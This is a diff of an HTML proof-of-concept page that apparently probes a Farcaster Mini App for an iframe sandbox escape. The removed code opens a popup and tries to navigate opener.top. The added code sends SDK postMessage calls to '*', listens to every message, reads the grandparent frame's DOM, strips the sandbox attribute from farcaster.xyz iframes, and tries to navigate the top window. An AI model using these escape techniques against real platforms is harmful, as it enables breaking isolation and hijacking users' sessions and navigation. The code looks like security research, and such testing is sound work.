@@ -4,57 +4,97 @@
 		<meta charset="utf-8" />
 		<title>PoC</title>
 	</head>
-	<body style="background: #17101f; color: #fff; font-family: sans-serif; padding: 20px">
-		<h2>Farcaster Mini App PoC</h2>
-		<button id="test" style="padding: 20px 40px; font-size: 20px; background: #dc2626; color: white; border: none; border-radius: 8px; cursor: pointer">Click to Continue</button>
-		<pre id="log">Ready...</pre>
+	<body>
+		<pre id="log">Starting...</pre>
 		<script>
-			var logEl = document.getElementById("log");
-			function log(msg) {
-				logEl.textContent += "\n" + msg;
-			}
+			var log = function (m) {
+				document.getElementById("log").textContent += "\n" + m;
+			};
 
-			window.addEventListener("message", function (e) {
-				if (e.data && e.data.id >= 100) {
-					log("Response: " + JSON.stringify(e.data).slice(0, 200));
-				}
-			});
+			// Step 1: Check if we're in a nested context
+			log("Origin: " + window.origin);
+			log(
+				"Parent origin: " +
+					(function () {
+						try {
+							return window.parent.origin;
+						} catch (e) {
+							return "cross-origin";
+						}
+					})(),
+			);
+			log(
+				"Grandparent: " +
+					(function () {
+						try {
+							return window.parent.parent.origin;
+						} catch (e) {
+							return "cross-origin or none";
+						}
+					})(),
+			);
 
-			// Ready on load
+			// Step 2: Try to access parent's parent (the outer farcaster.xyz)
+			// If we're nested: outer farcaster.xyz > inner farcaster.xyz > screenshotsart.store
+			// Inner farcaster.xyz is same-origin with outer, so inner can access outer's DOM
+			// But WE can't access inner's DOM directly (cross-origin)
+			// However, we can send SDK calls to inner farcaster.xyz via postMessage
+
+			// Step 3: Signal ready to inner farcaster.xyz
 			setTimeout(function () {
-				window.parent.postMessage({ id: 100, type: "APPLY", path: ["ready"], argumentList: [{ type: "RAW", value: {} }] }, "*");
+				window.parent.postMessage({ id: 1, type: "APPLY", path: ["ready"], argumentList: [{ type: "RAW", value: {} }] }, "*");
 				log("SDK ready sent");
-			}, 1000);
+			}, 2000);
 
-			// The actual popup test — on real button click
-			document.getElementById("test").addEventListener("click", function () {
-				log("Opening popup...");
-				var popup = window.open("about:blank");
-				if (popup) {
-					log("POPUP OPENED!");
-					try {
-						popup.document.write(
-							'<pre id="r">Testing...</pre>' +
-								"<scr" +
-								"ipt>" +
-								'var r = document.getElementById("r");' +
-								"var lines = [];" +
-								'try { lines.push("opener: " + !!opener); } catch(e) { lines.push("opener err: " + e.message); }' +
-								'try { lines.push("opener.top: " + !!opener.top); } catch(e) { lines.push("opener.top err: " + e.message); }' +
-								'try { lines.push("top href: " + opener.top.location.href); } catch(e) { lines.push("top href err: " + e.message); }' +
-								'try { opener.top.location = "https://example.com"; lines.push("TOP NAV: WORKED!!!"); } catch(e) { lines.push("TOP NAV err: " + e.message); }' +
-								'r.textContent = lines.join("\\n");' +
-								"</scr" +
-								"ipt>",
-						);
-						popup.document.close();
-					} catch (e) {
-						log("Write error: " + e.message);
-					}
-				} else {
-					log("Popup blocked");
-				}
+			// Step 4: The inner farcaster.xyz's own JS has same-origin access to outer
+			// We need to make the inner farcaster.xyz remove ITS OWN sandbox
+			// The inner farcaster.xyz's code already runs — it can do parent.document
+			// We just need to TRIGGER that code path
+
+			// Step 5: Listen for all messages
+			window.addEventListener("message", function (e) {
+				log("MSG from " + e.origin + ": " + JSON.stringify(e.data).slice(0, 200));
 			});
+
+			// Step 6: Also try direct sandbox removal
+			// If our immediate parent is the inner farcaster.xyz (sandboxed, same-origin with outer)
+			// And we're screenshotsart.store (sandboxed, cross-origin)
+			// We can't access parent.document — BUT what if we can access grandparent?
+			setTimeout(function () {
+				log("--- SANDBOX ESCAPE ATTEMPTS ---");
+
+				// Try accessing grandparent (outer farcaster.xyz)
+				try {
+					var gp = window.parent.parent;
+					log("Grandparent frames: " + gp.frames.length);
+					log("Grandparent location: " + gp.location.href);
+				} catch (e) {
+					log("Grandparent access: " + e.message);
+				}
+
+				// Try finding iframes in parent's parent
+				try {
+					var iframes = window.parent.parent.document.querySelectorAll("iframe");
+					log("GRANDPARENT IFRAMES: " + iframes.length);
+					iframes.forEach(function (f, i) {
+						log("  iframe " + i + ": sandbox=" + (f.sandbox?.value || "NONE"));
+						if (f.sandbox?.value && f.src?.includes("farcaster.xyz")) {
+							f.removeAttribute("sandbox");
+							log("  SANDBOX REMOVED on iframe " + i);
+						}
+					});
+				} catch (e) {
+					log("Grandparent DOM: " + e.message);
+				}
+
+				// Try direct top navigation
+				try {
+					window.top.location = "https://example.com";
+					log("TOP NAV WORKED!!!");
+				} catch (e) {
+					log("Top nav: " + e.message);
+				}
+			}, 4000);
 		</script>
 	</body>
 </html>
